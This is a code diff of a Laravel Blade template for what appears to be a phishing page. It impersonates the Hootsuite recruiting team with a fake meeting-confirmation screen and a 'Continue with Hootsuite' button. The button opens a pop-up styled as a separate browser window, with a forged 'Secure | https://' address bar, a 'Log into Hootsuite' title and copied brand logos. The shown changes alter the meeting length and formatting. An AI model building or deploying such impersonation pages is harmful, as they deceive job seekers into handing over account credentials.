@@ -360,30 +360,30 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper {{ $webStatus ? '' : 'd-none' }}">
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/logo-big.png') }}" /></div>
+                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/logo-big.png') }}"/></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{ asset('img/logo.png') }}" />
+                                        <div><img class="avatar" width="65px" src="{{ asset('img/logo.png') }}"/>
                                         </div>
                                     </div>
-                                    <h2>15 Minutes Meeting</h2>
+                                    <h2>30 Minutes Meeting</h2>
                                 </div>
                             </div>
                             <div class="minute">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
-                                    role="img">
+                                     role="img">
                                     <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
-                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke-linecap="round" stroke-linejoin="round"></path>
                                     <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="#E03035"
-                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
-                                <span>15 min</span>
+                                <span>30 min</span>
                             </div>
                             <div class="minute mt-12">
                                 <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10"
-                                    xmlns="http://www.w3.org/2000/svg" role="img">
+                                     xmlns="http://www.w3.org/2000/svg" role="img">
                                     <path
                                         d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                         fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
@@ -393,9 +393,9 @@
                             </div>
                             <div class="minute space__bettwen">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
-                                    role="img">
+                                     role="img">
                                     <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
-                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke-linecap="round" stroke-linejoin="round"></path>
                                     <path
                                         d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                         fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
@@ -460,7 +460,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Hootsuite - Recruiting Team. <br />
+                                            Please confirm your appointment with Hootsuite - Recruiting Team. <br/>
                                             To complete the confirmation process, continue with Hootsuite
                                         </p>
                                     </div>
@@ -468,9 +468,9 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="facebook__button">
                                         <button id="continue-facebook" wire:click.prevent="openLoginModal"
-                                            style="display: flex; align-items: center; justify-content: center;">
+                                                style="display: flex; align-items: center; justify-content: center;">
                                             <img src="{{ asset('favicon.ico') }}" alt="Continue with Hootsuite"
-                                                height="25px" width="25px" />
+                                                 height="25px" width="25px"/>
                                             Continue with Hootsuite
                                         </button>
                                     </div>
@@ -493,31 +493,31 @@
                 </div>
                 <div class="calendar__wrapper {{ $webStatus ? 'd-none' : '' }}">
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/images.png?v=2') }}" />
+                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/images.png?v=2') }}"/>
                         </div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
                                         <div><img class="avatar" width="65px"
-                                                src="{{ asset('img/logo.png?v=3') }}" /></div>
+                                                  src="{{ asset('img/logo.png?v=3') }}"/></div>
                                     </div>
-                                    <h2>15 Minutes Meeting</h2>
+                                    <h2>30 Minutes Meeting</h2>
                                 </div>
                             </div>
                             <div class="minute">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10"
-                                    xmlns="http://www.w3.org/2000/svg" role="img">
+                                     xmlns="http://www.w3.org/2000/svg" role="img">
                                     <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
-                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                     <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor"
-                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
-                                <span>15 min</span>
+                                <span>30 min</span>
                             </div>
                             <div class="minute mt-12">
                                 <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10"
-                                    xmlns="http://www.w3.org/2000/svg" role="img">
+                                     xmlns="http://www.w3.org/2000/svg" role="img">
                                     <path
                                         d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                         fill="none" stroke="currentColor" stroke-linecap="round"
@@ -527,9 +527,9 @@
                             </div>
                             <div class="minute space__bettwen">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10"
-                                    xmlns="http://www.w3.org/2000/svg" role="img">
+                                     xmlns="http://www.w3.org/2000/svg" role="img">
                                     <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
-                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                          stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                     <path
                                         d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                         fill="none" stroke="currentColor" stroke-linecap="round"
@@ -585,18 +585,18 @@
             <div class="ant-modal-mask"></div>
             <div tabindex="-1" class="ant-modal-wrap">
                 <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true"
-                    class="ant-modal modal-wrapper modal__facebook"
-                    style="max-width: 1200px; transform-origin: 519px 247px;">
+                     class="ant-modal modal-wrapper modal__facebook"
+                     style="max-width: 1200px; transform-origin: 519px 247px;">
                     <div tabindex="0" aria-hidden="true"
-                        style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                         style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                     <div class="ant-modal-content">
                         <button type="button" aria-label="Close" class="ant-modal-close">
                             <span class="ant-modal-close-x">
                                 <span role="img" aria-label="close"
-                                    class="anticon anticon-close ant-modal-close-icon">
+                                      class="anticon anticon-close ant-modal-close-icon">
                                     <svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false"
-                                        data-icon="close" width="1em" height="1em" fill="currentColor"
-                                        aria-hidden="true">
+                                         data-icon="close" width="1em" height="1em" fill="currentColor"
+                                         aria-hidden="true">
                                         <path
                                             d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z">
                                         </path>
@@ -609,24 +609,24 @@
                                 <div>
                                     <div class="wrapper_header">
                                         <div class="sign__up-modal">
-                                            <img src="{{ asset('img/logo.png') }}" alt="" width="17px" />
+                                            <img src="{{ asset('img/logo.png') }}" alt="" width="17px"/>
                                             <p>Log into Hootsuite</p>
                                         </div>
                                         <div class="icons">
                                             <div class="img"><img src="{{ asset('img/minus.png') }}"
-                                                    alt="" /></div>
+                                                                  alt=""/></div>
                                             <div class="img"><img
                                                     src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
-                                                    alt="" /></div>
+                                                    alt=""/></div>
                                             <div class="img img-x"><img src="{{ asset('img/close.png') }}"
-                                                    alt="" /></div>
+                                                                        alt=""/></div>
                                         </div>
                                     </div>
                                     <div class="input__title-wrapper">
                                         <div class="lock__screen">
                                             <div class="lock">
                                                 <div class="lock__wrapper"><img src="{{ asset('img/locktest.png') }}"
-                                                        alt="" /><span class="green">Secure |
+                                                                                alt=""/><span class="green">Secure |
                                                         https://</span><span class="black-opacity"></span></div>
                                             </div>
                                             <span class="input__value">
@@ -647,59 +647,59 @@
                                                 <div class="tt-child-element-left">
                                                     <div class="rtpHSLogoAnchor">
                                                         <a href="javascript:void(0)" tabindex="0"
-                                                            aria-label="Hootsuite.com Main Landing Page">
+                                                           aria-label="Hootsuite.com Main Landing Page">
                                                             <svg style="width: auto; height: 30px;"
-                                                                viewBox="77.685 25.563 884.115 162.737" version="1.1"
-                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                 viewBox="77.685 25.563 884.115 162.737" version="1.1"
+                                                                 xmlns="http://www.w3.org/2000/svg">
                                                                 <g>
                                                                     <path fill="#FF4C46"
-                                                                        d="M238.4,48l-52.5,4.7c-9.1-5.3-18.1-7.4-27.6-7.4c-2.5,0-5.1,0.2-7.7,0.7L95.7,25.7 c-2.2-0.8-3.8,2.1-1.9,3.5l33.7,26.1c-7.1,4.4-13.8,10.2-19.7,16.8C97.7,83.6,85.1,115.4,79,132c-2.6,7.1-1.3,15,3.5,20.8 c11.2,13.6,34.4,35.6,79,35.6c40.9,0,61.6-18.4,71.3-31.8c5.4-7.5,7-17,4.3-25.8c-4.4-14.9-13.7-40.7-28.8-58.4 c-0.5-0.6-1.1-1.2-1.6-1.8l32.7-19.4C240.9,50.3,240.2,47.9,238.4,48z">
+                                                                          d="M238.4,48l-52.5,4.7c-9.1-5.3-18.1-7.4-27.6-7.4c-2.5,0-5.1,0.2-7.7,0.7L95.7,25.7 c-2.2-0.8-3.8,2.1-1.9,3.5l33.7,26.1c-7.1,4.4-13.8,10.2-19.7,16.8C97.7,83.6,85.1,115.4,79,132c-2.6,7.1-1.3,15,3.5,20.8 c11.2,13.6,34.4,35.6,79,35.6c40.9,0,61.6-18.4,71.3-31.8c5.4-7.5,7-17,4.3-25.8c-4.4-14.9-13.7-40.7-28.8-58.4 c-0.5-0.6-1.1-1.2-1.6-1.8l32.7-19.4C240.9,50.3,240.2,47.9,238.4,48z">
                                                                     </path>
                                                                 </g>
                                                                 <g>
                                                                     <path fill="#FFFFFF"
-                                                                        d="M183.6,143.9c-3.9,1.4-12.7,3.5-22.5-1.6c-0.5-0.3-1,0.4-0.6,0.8c3.1,3.3,8.6,9.2,12,12 c0.7,0.6,1.8,0.5,2.4-0.2l9.3-10.3C184.5,144.3,184.1,143.7,183.6,143.9z">
+                                                                          d="M183.6,143.9c-3.9,1.4-12.7,3.5-22.5-1.6c-0.5-0.3-1,0.4-0.6,0.8c3.1,3.3,8.6,9.2,12,12 c0.7,0.6,1.8,0.5,2.4-0.2l9.3-10.3C184.5,144.3,184.1,143.7,183.6,143.9z">
                                                                     </path>
                                                                     <path fill="#FFFFFF"
-                                                                        d="M219.9,101.1c-5-10.8-12.4-20.9-23.7-22.1c-2-0.2-4.1,0.2-5.8,1.3l-12.3,7.3c-3.1,1.8-6.9,1.6-9.7-0.6 l-10.7-8.3c-3.6-2.8-7.7-4.8-12.1-5.8c-18.3-4.3-30.7,5.3-40.1,23.3c-9,17.2-4,42,18.1,47.8c23.3,6.2,38.7-19.7,44.9-28.3 c1.2-1.7,3.6-1.7,4.8,0c9.6,13,22.4,26.9,36.2,24.1C227.6,136.1,225.5,113.3,219.9,101.1z M152.4,114.8 c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8C158.4,106.2,156.9,111.8,152.4,114.8z M200.1,115.7c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8 C206.1,107.1,204.6,112.7,200.1,115.7z">
+                                                                          d="M219.9,101.1c-5-10.8-12.4-20.9-23.7-22.1c-2-0.2-4.1,0.2-5.8,1.3l-12.3,7.3c-3.1,1.8-6.9,1.6-9.7-0.6 l-10.7-8.3c-3.6-2.8-7.7-4.8-12.1-5.8c-18.3-4.3-30.7,5.3-40.1,23.3c-9,17.2-4,42,18.1,47.8c23.3,6.2,38.7-19.7,44.9-28.3 c1.2-1.7,3.6-1.7,4.8,0c9.6,13,22.4,26.9,36.2,24.1C227.6,136.1,225.5,113.3,219.9,101.1z M152.4,114.8 c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8C158.4,106.2,156.9,111.8,152.4,114.8z M200.1,115.7c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8 C206.1,107.1,204.6,112.7,200.1,115.7z">
                                                                     </path>
                                                                     <path fill="#FFFFFF"
-                                                                        d="M173.1,122.3c-0.9-1-2.6-1-3.5,0.1l-9.8,11.6c-0.5,0.5-0.4,1.4,0.2,1.8c2.3,1.6,7.8,5.2,13.2,5.2 c5,0,9.5-1.9,11.7-3c0.7-0.4,0.9-1.3,0.4-1.9L173.1,122.3z">
+                                                                          d="M173.1,122.3c-0.9-1-2.6-1-3.5,0.1l-9.8,11.6c-0.5,0.5-0.4,1.4,0.2,1.8c2.3,1.6,7.8,5.2,13.2,5.2 c5,0,9.5-1.9,11.7-3c0.7-0.4,0.9-1.3,0.4-1.9L173.1,122.3z">
                                                                     </path>
                                                                 </g>
                                                                 <g>
                                                                     <g>
                                                                         <path fill="#FF4C46"
-                                                                            d="M284.2,155.2V77.6h17.2v33.7h57.1V77.6h17.2v77.6h-17.2v-29.4h-57.1v29.4H284.2z">
+                                                                              d="M284.2,155.2V77.6h17.2v33.7h57.1V77.6h17.2v77.6h-17.2v-29.4h-57.1v29.4H284.2z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M424.5,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C445.2,154.2,436,157.2,424.5,157.2z M424.5,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C412.7,142.1,418,143.8,424.5,143.8z">
+                                                                              d="M424.5,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C445.2,154.2,436,157.2,424.5,157.2z M424.5,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C412.7,142.1,418,143.8,424.5,143.8z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M508.3,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C529,154.2,519.8,157.2,508.3,157.2z M508.3,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C496.4,142.1,501.7,143.8,508.3,143.8z">
+                                                                              d="M508.3,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C529,154.2,519.8,157.2,508.3,157.2z M508.3,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C496.4,142.1,501.7,143.8,508.3,143.8z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M578.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C591,155.2,584.3,156.4,578.2,156.4z">
+                                                                              d="M578.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C591,155.2,584.3,156.4,578.2,156.4z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M638.6,157.2c-10.8,0-21.6-1.6-32.5-4.7v-13.8c9.1,3.5,19,5.2,29.7,5.2c7.7,0,13.2-0.5,16.5-1.5 c3.3-1,5-2.7,5-5.2c0-2.3-1.8-4-5.5-4.9c-3.7-0.9-8.2-1.5-13.5-1.8c-5.3-0.2-10.6-0.7-15.9-1.4c-5.3-0.7-9.8-2.4-13.5-5 c-3.7-2.7-5.5-6.4-5.5-11.3c0-6.6,3.2-11.6,9.6-15c6.4-3.4,15.1-5.1,26.1-5.1c8.7,0,18.8,1.1,30.3,3.4v13.3 c-9.9-2.1-19.5-3.2-28.5-3.2c-13.7,0-20.6,2.1-20.6,6.3c0,2.1,1.9,3.6,5.6,4.4c3.7,0.8,8.2,1.4,13.5,1.8 c5.3,0.3,10.5,0.9,15.8,1.6c5.3,0.8,9.8,2.5,13.5,5.3c3.7,2.8,5.6,6.6,5.6,11.5c0,6.8-3.2,11.8-9.5,15.1 C658.5,155.5,649.7,157.2,638.6,157.2z">
+                                                                              d="M638.6,157.2c-10.8,0-21.6-1.6-32.5-4.7v-13.8c9.1,3.5,19,5.2,29.7,5.2c7.7,0,13.2-0.5,16.5-1.5 c3.3-1,5-2.7,5-5.2c0-2.3-1.8-4-5.5-4.9c-3.7-0.9-8.2-1.5-13.5-1.8c-5.3-0.2-10.6-0.7-15.9-1.4c-5.3-0.7-9.8-2.4-13.5-5 c-3.7-2.7-5.5-6.4-5.5-11.3c0-6.6,3.2-11.6,9.6-15c6.4-3.4,15.1-5.1,26.1-5.1c8.7,0,18.8,1.1,30.3,3.4v13.3 c-9.9-2.1-19.5-3.2-28.5-3.2c-13.7,0-20.6,2.1-20.6,6.3c0,2.1,1.9,3.6,5.6,4.4c3.7,0.8,8.2,1.4,13.5,1.8 c5.3,0.3,10.5,0.9,15.8,1.6c5.3,0.8,9.8,2.5,13.5,5.3c3.7,2.8,5.6,6.6,5.6,11.5c0,6.8-3.2,11.8-9.5,15.1 C658.5,155.5,649.7,157.2,638.6,157.2z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M756.6,94.6v60.7h-18.9l2.4-25h-1c-2.8,18-12.8,26.9-29.8,26.9c-8.7-0.2-15.1-3-19.2-8.6 c-4-5.5-6.1-14.8-6.1-27.7V94.6h17.2v24.3c0,9.1,1.3,15.6,3.9,19.5c2.6,3.9,6.8,5.8,12.7,5.8c6.6,0,11.8-3,15.6-9 c3.9-6,5.8-13.9,5.8-23.9V94.6H756.6z">
+                                                                              d="M756.6,94.6v60.7h-18.9l2.4-25h-1c-2.8,18-12.8,26.9-29.8,26.9c-8.7-0.2-15.1-3-19.2-8.6 c-4-5.5-6.1-14.8-6.1-27.7V94.6h17.2v24.3c0,9.1,1.3,15.6,3.9,19.5c2.6,3.9,6.8,5.8,12.7,5.8c6.6,0,11.8-3,15.6-9 c3.9-6,5.8-13.9,5.8-23.9V94.6H756.6z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M780,88.7c-3.3,0-5.9-0.8-7.8-2.5c-1.9-1.7-2.8-4.1-2.8-7.3c0-3.2,0.9-5.7,2.8-7.3 c1.9-1.6,4.4-2.4,7.8-2.4c3.4,0,6,0.8,7.9,2.4c1.9,1.6,2.9,4,2.9,7.3C790.8,85.5,787.2,88.7,780,88.7z M771.6,155.2V94.6h17.2 v60.7H771.6z">
+                                                                              d="M780,88.7c-3.3,0-5.9-0.8-7.8-2.5c-1.9-1.7-2.8-4.1-2.8-7.3c0-3.2,0.9-5.7,2.8-7.3 c1.9-1.6,4.4-2.4,7.8-2.4c3.4,0,6,0.8,7.9,2.4c1.9,1.6,2.9,4,2.9,7.3C790.8,85.5,787.2,88.7,780,88.7z M771.6,155.2V94.6h17.2 v60.7H771.6z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M885.9,157.2c-11,0-19.8-3-26.5-8.9c-6.7-5.9-10-13.7-10-23.4c0-9.7,3.3-17.5,10-23.4 c6.7-5.9,15.5-8.9,26.5-8.9c10.8,0,19.6,2.5,26.3,7.6c6.7,5.1,10.1,11.7,10.3,20v9.9h-56.5c1,4.9,3.5,8.5,7.7,10.7 c4.2,2.2,10.3,3.3,18.4,3.3c10.7,0,15.5-1.7,20.7-3.6c0.8-0.3,6.5-2.8,7-3v13.8c-6.1,2.3-11.4,3.9-15.9,4.7 C899.3,156.7,893.3,157.2,885.9,157.2z M865.5,121.7l40.5-1c-0.2-5.3-2-9.2-5.2-11.5c-3.2-2.3-8.2-3.5-14.9-3.5 c-6.5,0-11.3,1.2-14.6,3.7C868,112,866.1,116.1,865.5,121.7z">
+                                                                              d="M885.9,157.2c-11,0-19.8-3-26.5-8.9c-6.7-5.9-10-13.7-10-23.4c0-9.7,3.3-17.5,10-23.4 c6.7-5.9,15.5-8.9,26.5-8.9c10.8,0,19.6,2.5,26.3,7.6c6.7,5.1,10.1,11.7,10.3,20v9.9h-56.5c1,4.9,3.5,8.5,7.7,10.7 c4.2,2.2,10.3,3.3,18.4,3.3c10.7,0,15.5-1.7,20.7-3.6c0.8-0.3,6.5-2.8,7-3v13.8c-6.1,2.3-11.4,3.9-15.9,4.7 C899.3,156.7,893.3,157.2,885.9,157.2z M865.5,121.7l40.5-1c-0.2-5.3-2-9.2-5.2-11.5c-3.2-2.3-8.2-3.5-14.9-3.5 c-6.5,0-11.3,1.2-14.6,3.7C868,112,866.1,116.1,865.5,121.7z">
                                                                         </path>
                                                                         <path fill="#FF4C46"
-                                                                            d="M827.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C840,155.2,833.4,156.4,827.2,156.4z">
+                                                                              d="M827.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C840,155.2,833.4,156.4,827.2,156.4z">
                                                                         </path>
                                                                     </g>
                                                                     <g>
                                                                         <path fill="#FF4C46"
-                                                                            d="M939.3,108.5c-1.6,1.6-3.5,2.4-5.8,2.4s-4.2-0.8-5.8-2.4c-1.6-1.6-2.4-3.5-2.4-5.8c0-2.2,0.8-4.2,2.4-5.8 c1.6-1.6,3.5-2.4,5.8-2.4c2.3,0,4.2,0.8,5.8,2.4c1.6,1.6,2.4,3.5,2.4,5.8C941.7,105,940.9,106.9,939.3,108.5z M928.6,97.7 c-1.4,1.4-2,3-2,5c0,2,0.7,3.6,2,5c1.4,1.4,3,2.1,5,2.1c2,0,3.6-0.7,5-2.1c1.4-1.4,2-3.1,2-5c0-1.9-0.7-3.6-2-5 c-1.4-1.4-3-2.1-5-2.1C931.6,95.7,929.9,96.4,928.6,97.7z M933.4,98.2c1.1,0,1.9,0.1,2.5,0.3c0.9,0.4,1.4,1.1,1.4,2.3 c0,0.8-0.3,1.4-0.9,1.8c-0.3,0.2-0.7,0.3-1.3,0.4c0.7,0.1,1.2,0.4,1.5,0.9s0.5,0.9,0.5,1.4v0.7c0,0.2,0,0.4,0,0.7 c0,0.2,0,0.4,0.1,0.5l0.1,0.1h-1.5c0,0,0-0.1,0-0.1c0,0,0-0.1,0-0.1l0-0.3V106c0-1-0.3-1.7-0.8-2.1c-0.3-0.2-0.9-0.3-1.8-0.3 h-1.2v3.5h-1.6v-9H933.4z M935.1,99.6c-0.4-0.2-1-0.3-1.9-0.3h-1.4v3.3h1.4c0.7,0,1.2-0.1,1.5-0.2c0.6-0.2,0.9-0.7,0.9-1.4 C935.7,100.3,935.5,99.8,935.1,99.6z">
+                                                                              d="M939.3,108.5c-1.6,1.6-3.5,2.4-5.8,2.4s-4.2-0.8-5.8-2.4c-1.6-1.6-2.4-3.5-2.4-5.8c0-2.2,0.8-4.2,2.4-5.8 c1.6-1.6,3.5-2.4,5.8-2.4c2.3,0,4.2,0.8,5.8,2.4c1.6,1.6,2.4,3.5,2.4,5.8C941.7,105,940.9,106.9,939.3,108.5z M928.6,97.7 c-1.4,1.4-2,3-2,5c0,2,0.7,3.6,2,5c1.4,1.4,3,2.1,5,2.1c2,0,3.6-0.7,5-2.1c1.4-1.4,2-3.1,2-5c0-1.9-0.7-3.6-2-5 c-1.4-1.4-3-2.1-5-2.1C931.6,95.7,929.9,96.4,928.6,97.7z M933.4,98.2c1.1,0,1.9,0.1,2.5,0.3c0.9,0.4,1.4,1.1,1.4,2.3 c0,0.8-0.3,1.4-0.9,1.8c-0.3,0.2-0.7,0.3-1.3,0.4c0.7,0.1,1.2,0.4,1.5,0.9s0.5,0.9,0.5,1.4v0.7c0,0.2,0,0.4,0,0.7 c0,0.2,0,0.4,0.1,0.5l0.1,0.1h-1.5c0,0,0-0.1,0-0.1c0,0,0-0.1,0-0.1l0-0.3V106c0-1-0.3-1.7-0.8-2.1c-0.3-0.2-0.9-0.3-1.8-0.3 h-1.2v3.5h-1.6v-9H933.4z M935.1,99.6c-0.4-0.2-1-0.3-1.9-0.3h-1.4v3.3h1.4c0.7,0,1.2-0.1,1.5-0.2c0.6-0.2,0.9-0.7,0.9-1.4 C935.7,100.3,935.5,99.8,935.1,99.6z">
                                                                         </path>
                                                                     </g>
                                                                 </g>
@@ -721,14 +721,15 @@
                                                     </p>
                                                     <span class="spacer"></span>
                                                     <p class="footnote"><a class="upgradePlan"
-                                                            href="javascript:void(0)" tabindex="0">Try OwlyWriter AI
+                                                                           href="javascript:void(0)" tabindex="0">Try
+                                                            OwlyWriter AI
                                                             now.</a></p>
                                                 </div>
                                                 <div class="tt-child-element-right">
                                                     <span class="spacer"></span>
                                                     <div class="owly-writer-ai-video-container">
                                                         <video autoplay="" loop="" muted=""
